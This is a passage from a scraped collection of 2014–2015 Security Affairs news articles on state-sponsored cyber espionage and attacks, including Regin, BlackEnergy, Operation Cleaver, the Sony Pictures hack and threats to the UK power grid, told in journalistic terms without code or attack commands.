"https://securityaffairs.co/wordpress/tag/miniduke", "topic_name": "MiniDuke"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/onionduke", "topic_name": "OnionDuke"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hackers", "topic_name": "state sponsored hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/tor", "topic_name": "Tor"}]}, {"news_name": "Foreign hackers target UK Power Grid every minute", "news_link": "https://securityaffairs.co/wordpress/32045/cyber-crime/uk-power-grid-cyber-attacks.html", "title": "Foreign hackers target UK Power Grid every minute\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "January 11, 2015", "body": "UK Power Grid is targeted by hackers every minute according to James Arbuthnot, a member of parliament who chaired the Defense Select Committee until last year.\n\nAs reported by Bloomberg, Arbuthnot plans to visit National Grid Plc (NG/) next month to discuss the issue.\n\nArbuthnot confirmed the incessant attacks on national critical infrastructure and he doesn\u2019t exclude a major incident despite the enormous effort spent at the National Grid.\n\n\u201cOur National Grid is coming under cyber-attack not just day-by-day but minute-by-minute,\u201d Arbuthnot, whose committee scrutinized the country\u2019s security policy, told a conference in London last year. \u201cThere are, at National Grid, people of very high quality who recognize the risks that these attacks pose, and who are fighting them off,\u201d he said, \u201cbut we can\u2019t expect them to win forever.\u201d\n\nState-sponsored hackers, cyber terrorists are the main threat actors, but as confirmed by a recent research conducted by TrendMicro, also the cybercrime represents a serious menace.\n\n\n\nThe level of alert is high due to the large number of cyber attacks that are duly observed against the Britain\u2019s electricity transmission network. The UK Government is aware of the cyber threats and it is assigning the necessary resources to mitigate them, the Cabinet Office recently announced it is increasing spending on its cyber-security program to 860 million pounds ($1.3 billion).\n\nThe investment is significant, it is increased by approximately 32 percent compared to the amount (650 million pounds) allocated in the 2011.\n\nDespite the Home Office, the government department that oversees the U.K.\u2019s domestic intelligence agencies, declined to comment the report it is known that the British intelligence agency GCHQ will be expanding a program to share cyber-crime intelligence in the coming year.

Despite the attribution of the attacks is very difficult, security experts believe that Russia, Iran and China were behind the successfully breach.\n\nOne of the main problem related to the protection of critical infrastructure is the increasing technology introduced in these environments that is enlarging their surface of attack.

The FBI revealed many similarities between the wiper malware that infected the systems at Sony Pictures and other malicious code attributed to the North Korean cyber units. Below an excerpt from the FBI update:\n\nAs a result of our investigation, and in close collaboration with other U.S. government departments and agencies, the FBI now has enough information to conclude that the North Korean government is responsible for these actions. While the need to protect sensitive sources and methods precludes us from sharing all of this information, our conclusion is based, in part, on the following:\n\n\u2013 Technical analysis of the data deletion malware used in this attack revealed links to other malware that the FBI knows North Korean actors previously developed. For example, there were similarities in specific lines of code, encryption algorithms, data deletion methods, and compromised networks.\n\n\u2013 The FBI also observed significant overlap between the infrastructure used in this attack and other malicious cyber activity the U.S. government has previously linked directly to North Korea. For example, the FBI discovered that several Internet protocol (IP) addresses associated with known North Korean infrastructure communicated with IP addresses that were hardcoded into the data deletion malware used in this attack.\n\n-Separately, the tools used in the SPE attack have similarities to a cyber attack in March of last year against South Korean banks and media outlets, which was carried out by North Korea.\n\nThe US authorities are very concerned by the possibility that similar attacks will hit other companies in USA in the next months.\n\n\u201cWe are deeply concerned about the destructive nature of this attack on a private sector entity and the ordinary citizens who worked there. Further, North Korea\u2019s attack on SPE reaffirms that cyber threats pose one of the gravest national security dangers to the United States,\u201d read the FBI statement.\n\nIn response to the FBI update on the Sony Pictures hack, the North Korea has refused the accusations and has proposed a joint investigation with the US law enforcement according to the state news agency, KCNA.\n\nThe North Korean authorities explained that they can prove the Government has nothing to do with the cyberattack on Sony Pictures.

The accused are Wang Dong, Sun Kailiang, Wen Xinyu, Huang Zhenyu and Gu Chunhui, charged of 31 counts of espionage and theft of trade secrets[1].\n\nThe five soldiers are members of the PLA unit known as \u201cUnit 61398\u201c, which was raised to the headlines early last year. The unit was mentioned in a report by cybersecurity firm Mandiant as responsible for cyber attacks on U.S. government facilities, banks and companies.\n\nThe Chinese government\u2019s response was immediate and predictable:\u201dAllegations extremely ridiculous\u201d was the judgment of the Chinese Foreign Ministry, whose spokesman called for a prompt correction of this \u201cserious error without foundation that threatens international relations, cooperation with the USA and mutual trust.\u201d\n\nIn fact, the U.S. has been for years the target of military and economic espionage, with periodic subtraction of Terabytes of information from all areas of industry, and serious harm to safety and industrial rights. A striking example was the interest (from unidentified hackers) for construction projects for the Joint Strike Fighter aircraft, also known as the F-35 Lightning II, traces of which start from 2007.\n\nWhether China is behind all of that is not given to know, but in the opinion of Robert Gates, former Minister of Defense, the threat comes not only from that nation. In an interview with The Register, Gates expressed no surprise at the allegations that the Chinese Arm is trying to steal secrets and technology to U.S. companies, but extends to a dozen countries around the world the ability to conduct cyber espionage. He indicates, among others, France as the most likely after China.\n\nThese activities of cyber espionage are undoubtedly inspired or led by governments that may use military or civilian personnel when necessary.\n\nThe Chinese example is symptomatic, four possible vectors of attack[2] are easily identifiable: Communist Party of China (CPC), People\u2019s Liberation Army (PLA), State Owned Enterprises (SOE), Civilian Hackers (Hacktivists). In the case of PLA, the Mandiant[3] report has shown that its organizational structure is based on several units specialized, on different International areas.\n\nIn other countries, cyber units are basically composed by military personnel, but this does not exclude the presence of highly qualified civilians. The cyber units are nominally established for the purpose of defense against cyber-attacks, but it is well known that in this area, he who knows how to defend also knows how to attack.\n\nThe cyberspace has some key features that make it easy to use for cyber-attacks: it requires technology, is persistent and based on fantasy and complexity, has a low cost of entry, uses COTS hardware and software devices, requires motivation.\n\nThe militarization of cyberspace is thus well established and involves the possibility of inflicting damage, attacking networks of communication, altering or destroying data, in order to achieve a position of advantage.\n\nIn a military sense, a cyber-attack is an un-authorized raid into the network of another country. The attack is carried out in another domain, the Domain of Cyber. This fifth domain of war follows unconventional rules, favored by a nearly impossibility to trace the source of attacks in a decisive manner. International law does not clarify the exact attribution of responsibilities.\n\nIn this situation, an unconventional form of warfare between states which exploits the cyber-capabilities to \u201cdeny the opponent the effective use of systems, weapons and tools or other infrastructure and processes controlled by them,\u201d can turn into a Cyber-war[4].\n\nWhen dealing with conventional conflicts, the management procedures have been regulated by international treaties over time. The very cyber-war, i.e. the extension of the \u201carmed\u201d confrontation in the fifth domain, should follow the same rules. The doctrines of military officers from many countries qualify it as just like a conventional conflict, but reality is different.\n\nThere is disagreement on the term \u201ccyber-attack\u201d. When can we speak of an \u201cattack to the nation\u201d, and what is the limit of the destructive consequences beyond which we can speak of \u201coffensive attack\u201d? Is it necessary that there is loss of life or can\u2019t simply be triggered by material damage to the infrastructures? And also in this second case, which is the limit, the extent over which the trigger is configured as \u201cattack\u201d?\n\nHow is it possible to attribute liability in an incontrovertible manner, to a nation? Like a legal litigation, would it be necessary to have a third-party authority for forensic attribution to accountable actors, now in the cyberspace?\n\nWhen we talk about attack among states, in the \u201ccyber\u201d world the responsibility cannot be mandatorily attributed to military units of a party. Acts of \u201ccyber\u201d hostility can be caused by people not organized in recognized military units.\n\nThe lack of shared interpretation about the meaning of \u201ccyber-war\u201d and its rules, should not prevent the achievement of international agreements on how to conduct \u201ccybernetic\u201d war. In the opinion of some experts[5], a treaty should include obligations of effective cooperation in the investigation subsequent to cyber-crimes. The lack of cooperation would indicate guilt or complicity by the nation.\n\nOther analysts[6] prefer to extend the principles of the Geneva and The Hague Conventions to cyber-confrontations because they consider them also applicable/appropriate to this domain of confrontation. Signing humanitarian agreements for the creation of protected zones for the critical infrastructure of civilian interest, however, would not prevent the possibility of their involvement. The not framed cyber-warriors could be induced to not adhere to these protected enclaves of cyberspace. Particularly \u201cthe patriots who group together as cyber-armies\u201d[7] might be tempted to do that.\n\nThe result of this unregulated use of increasingly sophisticated technologies can still overturn social norms of coexistence or legitimate confrontation.\n\nIt is therefore necessary to first resolve the ambiguities in the interpretation of Countries\u2019 behaviour in cyberspace and create legal instruments for the recognition and attribution of responsibility to Nations.\n\nTherefore, it is necessary first of all to resolve ambiguities in the interpretation of the behavior of states in cyberspace and created legal instruments for the recognition and allocation of national responsibilities. Finally, international cooperation[8] has to be shared and reinforced in tackling cyber-crimes that have an alibi for the inevitable buck-passing.\n\n\n\nSuch agreements should regulate the conduct of military confrontation in this domain, establish some rules of deterrence (by denial) based on the response structures to cyber-attacks, strengthen regulations on cyber warfare because they enable the effective tracking threats.\n\nThe politics should give a crucial impulse to agreements between states. The need for a cyber-treaty to prevent future cyber-wars is turning out to be increasingly urgent. Its achievement would undoubtedly have a positive impact on all countries, reducing the heavy costs caused by cyber-crime[9].\n\nAbout the Author:\n\ning. Giuseppe G.

The Iranian hackers targeted critical infrastructure worldwide, ten of which are located in the United States.\n\n\n\nExperts at Cylance are cautions regarding the motivation behind the attacks on SCADA systems networks, they propend for a retaliation for Stuxnet and other campaign that hit the country. The exfiltrated data could be used by hackers to run further attacks for sabotage.\n\n\n\n\u201cWithin our investigation, we had no direct evidence of a successful compromise of specific Industrial Control Systems (ICS) or Supervisory Control and Data Acquisition (SCADA) networks, but Cleaver did exfiltrate extremely sensitive data from many critical infrastructure companies allowing them to directly affect the systems they run,\u201d Cylance said in its report. \u201cThis data could enable them, or affiliated organizations, to target and potentially sabotage ICS and SCADA environments with ease.\u201d\n\nThe list of targets identified by the researchers at Cylance is very long and includes at least one military entity in the U.S. by name, the Navy Marine Corps Intranet (NMCI) and organizations in several industries such as energy and utilities.\n\n\u201cWe discovered over 50 victims in our investigation, distributed around the globe. \u201c\n\nDespite the attribution is hard in these cases, the experts at Cylancea have found number of domains used in the various attacks that were registered to an Iranian corporation Tarh Andishan. The researchers also discovered that the ASNs and the netblocks are directly linked to the Iranian authorities, meanwhile the infrastructure exploited for the attacks is hosted by the Iranian hosting provider Netafraz.\n\n\u201cThey have bigger intentions: to position themselves to impact critical infrastructure globally,\u201d states the report \u201cWe believe that if the operation is left to continue unabated, it is only a matter of time before the world\u2019s physical safety is impacted by it. While the disclosure of this information will be a detriment to our ability to track the activity of this group, it will allow the security industry as a whole to defend against this threat.\u201d\n\nAn article published on The DailyMail refers a senior Iranian official who dismissed the report.\n\n\u201cThis is a baseless and unfounded allegation fabricated to tarnish the Iranian government image, particularly aimed at hampering current nuclear talks,\u201d commented Hamid Babaei, spokesman for Iran\u2019s mission to the United Nations.\n\nThe report also reveals that airports, principal airlines, government agencies, transportation companies, telecommunications operators, defense contractors and educational institutions are among the targeted institutions.\n\nThe experts revealed that during the period of observation, the threat actors have rapidly improved their cyber capabilities.\n\n \u201cDuring intense intelligence gathering over the last 24 months, we observed the technical capabilities of the Operation Cleaver team rapidly evolve faster than any previously observed Iranian effort. As Iran\u2019s cyber warfare capabilities continue to morph, the probability of an attack that could impact the physical world at a national or global level is rapidly increasing,\u201d states the Cylance report.\n\nThe threat actors behind the Operation Cleaver uses a mix of off-the-shelf SQL injection attacks and exploits for several Microsoft vulnerabilities, including  MS08-067 was also used by hackers in the popular Red October campaign.\n\nThe hacker adopted TTPs similar to the ones used by other APTs operating for foreign governments, including China and Russia. The Operation Cleaver crew also have customized tools in its arsenal that have been discovered by investigators.

As usual, one of the most interesting analysis was conducted by experts at Kaspersky Lab that issued a paper on the results of their investigation.\n\nThe primary victims of the Regin campaign include government entities, financial institutions, telecom operators, research organizations, multinational political bodies and individuals involved in advanced mathematical/cryptographical research.\n\nAccording to the experts, the development of the Regin platform requested a significant effort, its level of complexity led the research to believe that it was a product of a nation-state project. Regin was designed mainly for two  objectives, the intelligence gathering and the facilitating other further attacks on the targeted systems.\n\n\n\nThe Kaspersky Lab team explained that the most interesting aspect regarding their investigation about Regin is an infection of a large GSM operator. The GSM standard is still widely used, the experts at Kaspersky analyzed the activity log of a GSM base station controller and discovered that attackers gained access to the GSM network stealing the credentials that would allow them to control GSM cells of a large operator.\n\nThe attackers had access to the overall information about the activity of the targets within cells of the network, the threat actors would also use the access to the network to perform offensive actions against the victims.\n\n\u201cThe ability of this group to penetrate and monitor GSM networks is perhaps the most unusual and interesting aspect of these operations. In today\u2019s world, we have become too dependent on mobile phone networks which rely on ancient communication protocols with little or no security available for the end user. Although all GSM networks have mechanisms embedded which allow entities such as law enforcement to track suspects, there are other parties which can gain this ability and further abuse them to launch other types of attacks against mobile users.\u201d states the post on SecureList.\n\nThe experts reported that in April 2008, the threat actors gained access to administrative credentials that would allow them to manipulate a GSM network in a Middle Eastern country. The case reported in the paper represents a case study for the experts which noted a very insidious implementation of the control infrastructure.\n\n\u201cIn this specific country, all the victims we identified communicate with each other, forming a peer-to-peer network. The P2P network includes the president\u2019s office, a research center,educational institution network and a bank. These victims spread across the country are all interconnected to each other. One of the victims contains a translation drone which has the ability to forward the packets outside of the country, to the C&C in India. This represents a rather interesting command-and-control mechanism, which is guaranteed to raise very little suspicions. For instance, if all commands to the president\u2019s office are sent through the bank\u2019s network, then all the malicious traffic visible for the president\u2019s office sysadmins will be only with the bank, in the same country.\u201d\n\n\n\n \n\nRegin backdoor allowed attackers to issue several commands to the base station controller , including the listing of the current call forwarding settings of the Mobile Station and stopping cells in the GSM network. The list of countries targeted by the Backdoor Regin provided by Kaspersky includes Iran, Germany, Syria, Saudi Arabia and Russia that counted for 28 percent of infections:\n\nThe researchers at Symantec hypothesized that the campaign is active at least since 2008 and has been operated continuously until the 2011 when seems to be suspended to resurge form 2013. The investigations are still ongoing, security firms have no clues about the attack vector the hackers used initially to launch the attacks.\n\n\u201cThe exact method of the initial compromise remains a mystery, although several theories exist, which include man-in-the-middle attacks with browser zero-day exploits. For some of the victims, we observed tools and modules designed for lateral movement. So far, we have not encountered any exploits. The replication modules are copied to remote computers by using Windows administrative shares and then executed. Obviously, this technique requires administrative privileges inside the victim\u2019s network. In several cases, the infected machines were also Windows domain controllers. Targeting of system administrators via web-based exploits is one simple way of achieving immediate administrative access to the entire network.\u201d states Kaspersky.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  Regin Backdoor, cyber espionage)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/backdoor-regin", "topic_name": "Backdoor Regin"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/gsm", "topic_name": "GSM"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/kaspersky", "topic_name": "Kaspersky"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hackers", "topic_name": "state sponsored hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-malware", "topic_name": "state-sponsored malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/symantec", "topic_name": "Symantec"}]}, {"news_name": "Regin \u2013 Highly advanced spying tool discovered by Symantec", "news_link": "https://securityaffairs.co/wordpress/30472/cyber-crime/regin-highly-advanced-spying-tool-discovered-symantec.html", "title": "Regin \u2013 Highly advanced spying tool discovered by Symantec\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "November 24, 2014", "body": "Backdoor Regin, is the name assigned by the experts at Symantec to an advanced spying tool that has been used in cyber espionage campaigns against governments, infrastructure operators, private companies, researchers, and private individuals.\n\nRegin appears as a highly sophisticated malicious code, experts revealed that it has a degree of technical competence rarely seen, it has some resemblance with other state-sponsored malware like Flame,Duqu and the popular Stuxnet. Also in this case, Regin has a modular structure that makes the malware a very flexible agent that could be used by operators to tailor a campaign to individual targets, the effort necessary for its development appears significant, the experts speculate that it required months or years to be completed.\n\nThe circumstance led researchers to believe that Backdoor Regin was developed by a nation-state to spy on a wide range of international targets across several industries.\n\nThe evasion technique that allowed Regin backdoor to go undetected for years exploits a multi-staged process and each stage is hidden and encrypted. Regin is organized into five stages, each of which is encrypted except for the first one that implements the initial loader. Executing the first stage triggers a domino chain in which at each step the stage is decrypted and executed, and that in turn decrypts the successive stage, and so on.\n\n\u201cAs outlined in a new technical whitepaper from Symantec, Backdoor.Regin is a multi-staged threat and each stage is hidden and encrypted, with the exception of the first stage.  Executing the first stage starts a domino chain of decryption and loading of each subsequent stage for a total of five stages.  Each individual stage provides little information on the complete package. Only by acquiring all five stages is it possible to analyze and understand the threat.\u201d states the blog post from Symantec.\n\n\n\n\n\nThe experts have identified dozens of different payloads that are used to spy on the infected machine, the principal functions implemented by the authors of Regin include code for stealing passwords, monitoring network traffic, capturing screenshots, seizing control of the target\u2019s mouse and recovering deleted files.\n\nSome payloads appear to be tailored to specific targets, for example, one module was designed to sniff the traffic of mobile telephone base station controllers and another to monitor the traffic of a Microsoft IIS server.\n\nThe disconcerting aspect of the story relates to the dating of the Backdoor Regin, Symantec experts believe it was a framework that threat actors used in multiple campaigns that date back to 2008 or several years earlier. Regin is known to have been active until 2011. The name Regin was assigned by Microsoft to the underlying trojan, the malware resurfaced in 2013 when the researchers at Symantec identified it.\n\n\u201cEssentially, what we think we\u2019re looking at is different campaigns where in one infection they needed to sniff your keyboard whereas in another infection they wanted grab the user name and password of the admin connected to a base station controller,\u201d Liam O\u2019Murchu, manager of operations for Symantec Security Response, reported to Ars.\n\nAnalyzing the distribution of targeted industries it is possible to note that Regin was used to compromise Telecom Backbone in 28 percent of the attacks, the experts believe that the operators managing the cyber espionage campaign were interested to spy on specific customers of the targeted companies.\n\n \n\n\n\nThe infections of Backdoor Regin detected by Symantec are also geographically diverse, attacks were observed in mainly in ten different countries, Russian Federation (28%), Saudi Arabia (24%), Ireland (9%) and Mexico (9%) lead the list.\n\nThe investigation is still ongoing, researchers at Symantec are aware of only about 100 infections, but a so powerful platform was surely used in a larger number of targeted attacks still uncovered. The researchers haven\u2019t yet identified the command and control servers the attackers used, the knowledge of the control infrastructure provides to the experts a huge quantity of data that could support further analysis.\n\n\u201cSymantec believes that many components of Regin remain undiscovered and additional functionality and versions may exist.  Additional analysis continues and Symantec will post any updates on future discoveries\u201d states the post.\n\nStay tuned for further information.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  Backdoor Regin, cyber espionage)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/backdoor-regin", "topic_name": "Backdoor Regin"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/duqu", "topic_name": "duqu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flame", "topic_name": "Flame"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hackers", "topic_name": "state sponsored hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-malware", "topic_name": "state-sponsored malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/symantec", "topic_name": "Symantec"}]}, {"news_name": "NSA Director Mike Rogers confirms risks of major cyber attacks", "news_link": "https://securityaffairs.co/wordpress/30373/cyber-warfare-2/nsa-director-mike-rogers-confirms-risks-major-cyber-attacks.html", "title": "NSA Director Mike Rogers confirms risks of major cyber attacks\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "November 21, 2014", "body": "In the recent weeks different attacks hit US infrastructure, the networks at The State Department, at the US Postal Service systems and at the WhiteHouse were compromised by hackers.

Do not be fooled by the numbers, unfortunately, many of the attacks are difficult to detect and often ATP groups are able to operate in the shadows for years before being discovered. Between April 2013 and 2014, threat actors hit 37% of energy companies, according the results of a survey by ThreatTrack Security, making energy sector one of the most critical industries under cyber security perspective.\n\n\u201cThe survey found that 35% of respondents reported endpoints on their network had been infected by malware that evaded their defenses during the last 12 months. Moreover, 58% of respondents cited the complexity of malware as the most difficult aspect of defending their organization.\u201d reports the survey, highlighting the difficulties of tracking the threats due to their level of sophistication. \u201cRespondents within the energy sector (37%) reported a 6% higher rate of infection than their financial services counterparts.\u201d\n\n\n\n \n\nSecurity experts at FireEye firm have identified nearly 50 strain of malware that specifically target energy companies in 2013, the company in the sector were mainly targeted by spyware and RATs, the FireEye annual report shows that the most common vertical targets of Dark Comet operations in 2013 were financial services, energy/utilities, and education.\n\nIn July 2014 researchers at FireEye detected a new variant of Havex RAT that was specifically designed to scans SCADA network via Object linking and embedding for Process Control (OPC), control systems hit by the malware are vital components in any industrial process including energy.\n\nIn June 2014 experts at F-Secure discovered instances of the Havex malware used to target Industrial Control Systems (ICS) in surgical attacks implementing \u201cwatering-hole attack\u201d scheme which involved ICS vendor site as intermediary target.  It has been estimated that the number of compromised energy companies in the US and Europe is nearly 1000, an impressive number that gives us an idea of the impact of the Havex operation.\n\nA few weeks ago, the US-CERT issued an Alert (ICS-ALERT-14-281-01A) related to an ongoing sophisticated Malware campaign compromising ICS systems with BlackEnergy malware.\n\nThe BlackEnergy malware was authored by a Russian hacker and originally used for DDoS attacks, bank frauds and spam distribution, but the new strain of malware was used in targeted attacks on government entities and private companies across a range of industries.\n\nAccording to the report proposed by experts at ESET, the new strain of malware has been found targeting more than 100 government and industry organizations in Poland and the Ukraine, but the cases are not isolated, other attacks based on BlackEnergy hit a target in Brussels, Belgium, as reported by F-Secure.\n\nIn a recent interview released to Bloomberg I commented the fact that these attacks apparently haven\u2019t caused any damage.\n\n\u201cWhatever they were up to, the cyber-infiltrators didn\u2019t use the digital weapons they\u2019d planted to do any damage.\u201d \u201cThis suggests that attackers are collecting detailed information on systems and processes running the vital infrastructure of the U.S.\u2026to coordinate further attacks,\u201d says Pierluigi Paganini, a security analyst who publishes the blog SecurityAffairs.

The attackers have infected the software that runs in the critical infrastructure with a malware, the circumstance creates a lot of anxiety in Intelligence and military industry due to the vital role of the hacked architecture.\n\nAn attack against critical infrastructure poses a serious risk for the stability of any government, the damages could be of different nature, including huge economic losses and losses of human lives.\n\nSources reported to the news agency that the attacks appear to be state-sponsored hacking campaign and that the Russia is the nation that is coordinating them.\n\n\u201cA destructive \u201cTrojan Horse\u201d malware program has penetrated the software that runs much of the nation\u2019s critical infrastructure and is poised to cause an economic catastrophe, according to the Department of Homeland Security. National Security sources told ABC News there is evidence that the malware was inserted by hackers believed to be sponsored by the Russian government, and is a very serious threat.\u201d reports the ABCnews.\u201d\n\nThe experts speculate that the ICS SCADA systems in many plants have been infected, these software controls critical processes for the operation of critical infrastructure, including power transmission grids, wind turbines, nuclear plants and oil and gas pipelines.\n\n\n\nThe DHS revealed that the hacking campaign has been running at least since 2011, despite so sabotage act has been detected since now.\n\n\u201cDHS sources told ABC News they think this is no random attack and they fear that the Russians have torn a page from the old, Cold War playbook, and have placed the malware in key U.S. systems as a threat, and/or as a deterrent to a U.S. cyber-attack on Russian systems \u2013 mutually assured destruction.\u201d continues the ABCnews. \u201cThe hack became known to insiders last week when a DHS alert bulletin was issued by the agency\u2019s Industrial Control Systems Cyber Emergency Response Team to its industry members. The bulletin said the \u201cBlackEnergy\u201d penetration recently had been detected by several companies.\u201d\n\nThe BlackEnergy malware was written by a Russian hacker and it was originally used to run DDoS attacks, bank frauds and for spam distribution. The new variant was used in targeted attacks on government entities and private companies across a range of industries. According to a report issued by ESET, the new varian has been found targeting more than 100 government and industry organizations in Poland and the Ukraine, and other attacks based on BlackEnergy hit a target in Brussels, Belgium, as reported by F-Secure.\n\nF-Secure security adviser Sean Sullivan speculated that BlackEnergy detected in Brussels have been used in a targeted attack on the European Parliament or European Commission.\n\nExperts Robert Lipovsky and Anton Cherepanov from ESET presented at the Virus Bulletin conference in Seattle the findings of their research, the malicious campaigns based on BlackEnergy malware started during 2014 and are still ongoing.\n\nUS infrastructure and government agencies are constantly under attack, a few weeks ago the White House confirmed to have suffered a cyberattack on its computer network which lasted for almost two weeks. In that circumstance, according to an unnamed official at the White House, hackers infiltrated an unclassified network and the Obama Administration has confirmed the incident. Different media agencies, including The Washington Post cited sources as saying that the attackers were linked to the Russian government. The worrying news is that the attacks was not initially discovered by the White House staff, and according to the Post an \u201cally\u201d made US officials aware of the offensive, meanwhile the US Intelligence reported that the attacks triggered an internal detection system.\n\nThe unique certainty is that almost every government is working to improve its cyber capabilities and to protect critical infrastructure from attacks by foreign hackers.\n\nPierluigi Paganini\n\nSecurity Affairs \u2013  (critical infrastructure, Russia)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/blackenergy", "topic_name": "BlackEnergy"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructure", "topic_name": "critical infrastructure"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/dhs", "topic_name": "DHS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ics", "topic_name": "ICS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/scada", "topic_name": "SCADA"}]}, {"news_name": "China unveils laser defense system that could shoot down small drones in a few seconds", "news_link": "https://securityaffairs.co/wordpress/29858/hacking/china-laser-vs-small-drones.html", "title": "China unveils laser defense system that could shoot down small drones in a few seconds\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "November 4, 2014", "body": "The Chinese Government has completed the development of a new weapon that is able to hit and shoot down small drones and aircraft in a few seconds. The China has successfully tested a highly accurate laser defense system that could be used to attack light unmanned aerial vehicles (UAVs), according to the results of tests the laser is able to hit a drone in a two-kilometer range and can destroy \u201cvarious small aircraft\u201d within five seconds of locating its target.\n\nThe official Xinhua news agency reported that the test results are very interesting because the laser is able to point-and-destroy unmanned, small-scale drones flying under an altitude of 500 meters and at speeds below 50 meters per second. The system appears to show a great precision and a low noise as confirmed by one of the researchers involved in the development of the weapon at the China Academy of Engineering Physics (CAEP). The Chinese Academy is also working on developing other laser weapons with greater power and range.\n\nDuring a test session the laser defense system successfully bring down over 30 drones, with a 100 percent success rate, according to the news reported by Chinese media.\n\n\n\nThis kind of weapons could represent a privileged solution to prevent attacks during major events in urban areas or to avoid that spying drones could be used in the urban area for reconnaissance. Let me also add that the type of targets that the laser defense system is able to bring down belong to the category of vehicles more exposed to the risk of hacking, in these cases a defense system like the one developed by the Chinese authorities could prevent that the UVA is controlled by the attackers.\n\n\u201cIntercepting such drones is usually the work of snipers and helicopters, but their success rate is not as high and mistakes with accuracy can result in unwanted damage,\u201d explained Yi Jinsong, a manager with China Jiuyuan Hi-Tech Equipment Corp.\n\nSmall-scale unmanned drones are widespread, their number is increasing and their use is becoming very popular also for commercial uses increasing the likelihood of incidents and criminal abuses.\n\nSmall drones are cheap and easy to use and acquire, making these vehicles an optimal choice for terrorists that intend to hit a target or spy on it (i.e. Critical infrastructure).\n\n\u201cConcerns have also been raised recently over drones involved in unlicensed mapping activities, and the negative effect this could have on both military and civil aerial activities. \u201d reports RT.com agencies.\n\nThe research on these drones is providing continuous improvements, experts sustain that the new generations of UAVs will be characterized by high performance, high autonomy and an extreme versatility, which makes their use suitable for many industries.\n\nThe US military is developing a new pocket-drone, called Extreme Access Pocket Flyer, that is able to fly for two hours and could be used for surveillance activities transmitting HD-quality video without resorting to Wi-Fi.\n\n\u201cBy 2020, the Federal Aviation Administration (FAA) expects to have as many as 30,000 drones flying over the United States. Of course, the large diffusion of the vehicles must be sustained by meticulous attention to matters related to the security and privacy of the population.\n\nThe use of these vehicles raises a series of discussions about their security. These systems are complex environments that theoretically could be hacked becoming a weapon in the hand of attackers. Other serious questions are related to their use in the civil sector and privacy issue related to the improper management of data collected by the drone during the missions.\u201d I have reported on the topic in a post published by the Infosec Institute.\n\nThe post published by RT.com provides further details related to the diffusion of drones, for example the independent, nonprofit, public policy institute, Stimson revealed that  the US has the\u201cworld\u2019s largest and most sophisticated fleet of weaponized UAVs,\u201d though America is \u201cnot likely to remain the world leader in the development of innovative UAV technologies.\u201d \n\nPierluigi Paganini\n\nSecurity Affairs \u2013  (Drones, China)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructure", "topic_name": "critical infrastructure"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/drones", "topic_name": "Drones"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/laser-weapon", "topic_name": "laser weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/unmanned-aerial-vehicles", "topic_name": "unmanned aerial vehicles"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us", "topic_name": "US"}]}, {"news_name": "China considers cybersecurity a primary need", "news_link": "https://securityaffairs.co/wordpress/29080/intelligence/china-cyber-strategy.html", "title": "China considers cybersecurity a primary need\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "October 13, 2014", "body": "It\u2019s not a mystery, China is within those countries that most of all are investing to improve cyber capabilities and strengthen its leadership in the cyber space.

